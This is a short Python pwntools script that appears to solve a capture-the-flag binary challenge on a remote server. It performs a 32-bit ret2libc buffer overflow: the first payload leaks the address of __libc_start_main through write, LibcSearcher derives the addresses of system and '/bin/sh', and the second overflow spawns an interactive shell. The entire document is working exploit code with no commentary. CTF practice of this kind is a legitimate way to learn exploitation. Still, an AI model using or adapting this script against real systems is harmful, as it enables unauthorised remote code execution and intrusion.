from pwn import *
from LibcSearcher import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 62639)
#sh = gdb.debug('./pwn', "b *0x8048477")
context.binary = './pwn'
e = ELF('./pwn')
context.log_level = 'debug'

__libc_start_main_got = e.got['__libc_start_main']
_write_plt = e.plt['write']
_start_addr = e.symbols['_start']

padding = b'a'*(0x88+4)

payload = flat([padding, _write_plt, _start_addr, 1, __libc_start_main_got, 8])
sh.recv()

sh.sendline(payload)

__libc_start_main_addr = u32(sh.recv()[:4])

libc = LibcSearcher('__libc_start_main', __libc_start_main_addr)

libc_offset = __libc_start_main_addr - libc.dump('__libc_start_main')
_system_addr = libc_offset + libc.dump('system')
_bin_sh_addr = libc_offset + libc.dump('str_bin_sh')

payload = flat([padding, _system_addr, 0xdeadbeef, _bin_sh_addr])

sh.sendline(payload)

sh.interactive()
